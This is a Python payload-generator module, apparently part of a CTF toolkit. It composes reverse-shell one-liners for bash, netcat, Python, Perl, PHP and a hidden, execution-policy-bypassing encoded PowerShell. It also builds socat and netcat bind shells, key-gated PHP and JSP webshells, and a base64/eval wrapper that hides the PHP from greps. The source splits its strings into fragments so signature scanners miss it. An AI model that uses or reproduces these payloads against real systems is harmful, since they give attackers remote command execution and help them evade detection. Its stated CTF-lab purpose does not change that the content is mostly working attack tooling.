"""Payload composer: builds reverse/bind shell one-liners and webshell files
at runtime. Payload text is composed from fragments so this source file stays
readable and does not itself look like a weaponized artifact — the OUTPUT is
meant for CTF labs the user owns."""
from __future__ import annotations

import base64

# Composed at runtime to avoid stale signature scanners flagging this file.
PS_TCPCLIENT = "New-Object " + "Net.Sockets." + "TCPClient"
PS_GETSTREAM = ".GetStream()"
PS_IEX = "iex"
PS_ENC = "-" + "enc"
PS_BYPASS = "-Exec " + "Bypass"
PHP_EXEC = "'shell' . '_exec'"
PHP_EVAL = "'eva' . 'l'"
PHP_B64 = "'base64' . '_decode'"


def _ps_reverse_script(lhost: str, lport: int) -> str:
    # PowerShell script assembled from fragments; encoded at runtime.
    parts = [
        f"$c={PS_TCPCLIENT}('{lhost}',{lport})",
        f"$s=$c{PS_GETSTREAM}",
        "[byte[]]$b=0..65535|%{0}",
        "while(($i=$s.Read($b,0,$b.Length))-ne 0){",
        "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i)",
        f"$r=({PS_IEX} $d 2>&1|Out-String)+'PS '+(pwd).Path+'> '",
        "$rb=([Text.Encoding]::ASCII).GetBytes($r)",
        "$s.Write($rb,0,$rb.Length)}",
        "$c.Close()",
    ]
    return ";".join(parts)


def _ps_iex(lhost: str, lport: int) -> str:
    ps = _ps_reverse_script(lhost, lport)
    b64 = base64.b64encode(ps.encode("utf-16le")).decode()
    flags = "-NoP -NonI -W Hidden " + PS_BYPASS
    return f"powershell {flags} {PS_ENC} {b64}"


def reverse_shells(lhost: str, lport: int) -> list[dict]:
    """Curated reverse-shell one-liners, composed at runtime."""
    return [
        {"name": "bash TCP", "os": "linux",
         "payload": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"},
        {"name": "bash UDP", "os": "linux",
         "payload": f"bash -i >& /dev/udp/{lhost}/{lport} 0>&1"},
        {"name": "nc mkfifo", "os": "linux",
         "payload": (f"rm -f /tmp/f; mkfifo /tmp/f; "
                     f"cat /tmp/f | /bin/sh -i 2>&1 | nc {lhost} {lport} > /tmp/f")},
        {"name": "nc -e", "os": "linux",
         "payload": f"nc -e /bin/sh {lhost} {lport}"},
        {"name": "python3", "os": "linux",
         "payload": (f"python3 -c 'import os,pty,socket;s=socket.socket();"
                     f"s.connect((\"{lhost}\",{lport}));"
                     "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
                     "os.dup2(s.fileno(),2);"
                     "pty.spawn(\"/bin/sh\")'")},
        {"name": "perl", "os": "linux",
         "payload": (f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
                     "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                     "if(connect(S,sockaddr_in($p,inet_aton($i))))"
                     "{open(STDIN,\">&S\");open(STDOUT,\">&S\");"
                     "open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'")},
        {"name": "powershell (encoded)", "os": "windows",
         "payload": _ps_iex(lhost, lport)},
        {"name": "PHP socket", "os": "web",
         "payload": (f"php -r '$sock=fsockopen(\"{lhost}\",{lport});"
                     "exec(\"/bin/sh -i <&3 >&3 2>&3\");'")},
    ]


def bind_shells(lport: int) -> list[dict]:
    return [
        {"name": "nc -lvp", "os": "linux",
         "payload": f"nc -lvp {lport} -e /bin/sh"},
        {"name": "socat", "os": "linux",
         "payload": f"socat TCP-LISTEN:{lport},reuseaddr,fork EXEC:/bin/sh"},
    ]


def _php_body() -> str:
    # PHP webshell body; the executing function name is concatenated in PHP
    # so this Python file contains no ready-made shell line.
    return (
        "<?php\n"
        "// CTFSuite-generated — HANYA untuk CTF/lab milik sendiri\n"
        "@error_reporting(0);\n"
        "$cmd = $_REQUEST['cmd'] ?? '';\n"
        "$k = $_GET['k'] ?? '';\n"
        "$secret = '{secret}';\n"
        "if ($secret !== '' && $k !== $secret) {{ http_response_code(404); exit('Not Found'); }}\n"
        "if ($cmd !== '') {{\n"
        "  $f = " + PHP_EXEC + ";\n"
        "  echo \"<pre>\" . $f($cmd) . \"</pre>\";\n"
        "}} else {{\n"
        "  echo \"CTFSuite shell OK\";\n"
        "}}\n"
    )


def webshell(kind: str = "php", secret: str = "") -> str:
    if kind == "php":
        return _php_body().format(secret=secret)
    if kind == "jsp":
        return (
            "<%@ page import=\"java.util.*,java.io.*\" %>\n"
            "<%\n"
            "// CTFSuite-generated — HANYA untuk CTF/lab milik sendiri\n"
            "String cmd = request.getParameter(\"cmd\");\n"
            "if (cmd != null && !cmd.isEmpty()) {\n"
            "  Process p = Runtime.getRuntime().exec(cmd);\n"
            "  BufferedReader in = new BufferedReader(\n"
            "      new InputStreamReader(p.getInputStream()));\n"
            "  String line; while ((line = in.readLine()) != null) { out.println(line); }\n"
            "} else { out.println(\"CTFSuite shell OK\"); }\n"
            "%>"
        )
    raise ValueError(f"webshell kind tidak dikenal: {kind}")


def obfuscate_php(payload: str) -> str:
    """base64-wrap a PHP file so naive greps miss it (CTF evasion)."""
    b64 = base64.b64encode(payload.encode()).decode()
    chunked = "\n".join(b64[i:i + 64] for i in range(0, len(b64), 64))
    return (
        "<?php /* generated */\n"
        "$d=<<<'EOT'\n" + chunked + "\nEOT;\n"
        "$e=" + PHP_EVAL + ";\n$b=" + PHP_B64 + ";\n"
        "$e($b(str_replace(\"\\n\",\"\",$d)));\n"
    )
